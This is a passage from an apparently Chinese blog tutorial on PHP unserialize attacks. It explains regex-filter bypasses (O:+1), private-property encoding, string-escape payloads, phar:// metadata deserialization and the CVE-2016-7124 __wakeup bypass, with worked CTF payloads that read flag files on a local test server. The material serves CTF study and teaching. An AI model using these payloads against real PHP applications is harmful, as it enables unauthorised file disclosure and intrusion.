class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;file !== <span class="keyword">__FILE__</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="keyword">__FILE__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">$file = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[OC]:\d+:/i&#x27;</span>, $file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacking!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@unserialize($_REQUEST[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则表达式中对file进行了过滤</p><p>当遇到 字母<code>O</code>或<code>C</code> 加上<code>:</code>，再加上一段数字和<code>:</code>，后面的 i 表示不区分大小写 时，则die掉。</p><p>该正则表达式匹配的部分为：<code>O:1:</code></p><p>若在中间插入一些字符，就可以让它匹配不完全，这样就可以绕过正则匹配</p><p>对于数字 1 来说，+1 和 1 时一样的，这样就可以绕过</p><p>但在URL传参中，会进行解码，会把加号（+）变成空格，所以应用<code>+</code>的URL编码：<code>%2b</code>代替</p><p>即：</p><blockquote><p>O:%2b1:</p></blockquote><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a>私有属性绕过</h3><p><a href="https://www.cnblogs.com/jsdd/p/11603919.html">php中的访问类型（public，private，protected）</a></p><p>public 公有修饰符，类中的成员没有访问限制，所有外部成员都可以访问（读和写）这个类成员（包括成员属性和成员方法）。</p><p>private 私有修饰符，被定义为private的成员，对于同一个类里的所有成员是可见的，即没有访问限制；但对于该类的外部代码时不允许改变甚至读操作的，对于该类的子类，也不能访问private修饰的成员。</p><p>protected 保护成员修饰符，被修饰为protected的成员不能被该类的外部代码访问。但是对于该类的子类有访问权限，可以进行属性、方法的读及写操作。</p><blockquote><p>public 表示全局，类内部外部子类都可以访问；<br>private 表示私有的，只有本类内部可以使用；<br>protected 表示受保护的，只有本类或子类或父类中可以访问；</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test1 = <span class="string">&quot;hello&quot;</span></span><br><span class="line">    <span class="keyword">private</span> $test2 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/10/07/0ahFhQ.png" alt="0ahFhQ.png"></p><p>test类定义了三个不同类型(公有，私有，保护)，但是值相同的字符串，序列化输出的值不相同</p><p>private属性序列化为：%00类名%00变量名，对于test2来说，序列化后的长度则变为11</p><p>protected属性序列化为：%00*%00变量名，对于test3来说，序列化后的长度则变为8</p><blockquote><p>%00是不可见字符</p></blockquote><p>对test.php继续进行修改</p><p>将public改为private</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $file = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;file !== <span class="keyword">__FILE__</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="keyword">__FILE__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">$file = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[OC]:\d+:/i&#x27;</span>, $file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacking!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@unserialize($_REQUEST[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化带private属性的file</p><p><code>&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>将<code>file</code>改为<code>%00A%00file</code>，对应的长度改为<code>7</code></p><p>即：</p><blockquote><p>{s:7:”%00A%00file”;s:8:”flag.php”;}</p></blockquote><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>在网站根目录下有两个文件，test.php和flag.php</p><p>test.php源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">255</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $filename = <span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, $s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;x&#x27;</span>]) &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">$a = [</span><br><span class="line"><span class="number">0</span> =&gt; $_REQUEST[<span class="string">&#x27;x&#x27;</span>],</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;1&quot;</span></span><br><span class="line">];</span><br><span class="line">@unserialize(waf(serialize($a)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">new</span> A();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload：</p><p>首先要有个<code>&quot;;</code>使前面的字符串闭合</p><p>接下来是常规的序列化后的数组元素</p><p><code>i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>但在waf()函数中，对序列化后的$a进行替换，所以将<code>s</code>改为<code>S</code>，将<code>flag.php</code>改为十六进制的<code>\66\6C\61\67\2E\70\68\70</code>，即</p><p><code>i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;</code></p><p>最后再加上<code>&#125;</code>使前面数组a的<code>&#123;</code>闭合</p><p>所以合起来是</p><p><code>&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = [</span><br><span class="line"><span class="number">0</span> =&gt; <span class="string">&#x27;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&#x27;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><p><code>a:2:&#123;i:0;s:65:&quot;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;</code></p><p>所以该段字符串有65个字符</p><p>利用waf()函数将flag替换为index会增加一个字符，构造65个flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c print(<span class="string">&#x27;flag&#x27;</span>*<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>将输出结果和前面的字符串拼接在一起，得到payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>附：</p><p>验证payload是否正确</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/flag/&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = [</span><br><span class="line"><span class="number">0</span> =&gt; <span class="string">&#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&#x27;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(waf(serialize($a)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">print_r(unserialize(waf(serialize($a))));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:325:&quot;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; __PHP_Incomplete_Class Object</span><br><span class="line">        (</span><br><span class="line">            [__PHP_Incomplete_Class_Name] &#x3D;&gt; A</span><br><span class="line">            [filename] &#x3D;&gt; flag.php</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(len(&#x27;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p>输出：325</p><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>(不太懂phar反序列化怎么用，这部分摘自<a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a>)</p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><p>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以明显的看到meta-data是以序列化的形式存储的：</p><p><img src="https://images.seebug.org/content/images/2018/08/ea55a494-3d8e-4bd9-9cae-e604194495b0.png-w331s" alt="img"></p><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt="img"></p><ul><li>phar_test1.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images.seebug.org/content/images/2018/08/7497d95b-b33f-4de8-bc5e-03890aff1bd9.png-w331s" alt="img"></p><p>其他函数当然也是可行的：</p><ul><li>phar_test2.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">&#x27;phar://phar.phar/a_random_string&#x27;</span>;</span><br><span class="line">    file_exists($filename);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="unserialize1"><a href="#unserialize1" class="headerlink" title="unserialize1"></a>unserialize1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造序列化代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> XianZhi();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;/flag&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/30/anYHMt.png" alt="anYHMt.png"></p><h3 id="unserialize2"><a href="#unserialize2" class="headerlink" title="unserialize2"></a>unserialize2</h3><p><strong>OC绕过、wake up绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里首先有两个要绕过的点</p><p>第一个点是<code>__wakeup()</code>，因为这里正常反序列化会写死<code>$this-&gt;ﬁle</code>属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会绕过<code>wakeup()</code>。</p><p>第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是<code>O:4</code>，直接使用+号当做空格即可绕过，即<code>O:+4</code>即可绕过。</p><p>构造序列化代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">&#x27;f15g_1s_here.php&#x27;</span>);</span><br><span class="line">$a = serialize($a).<span 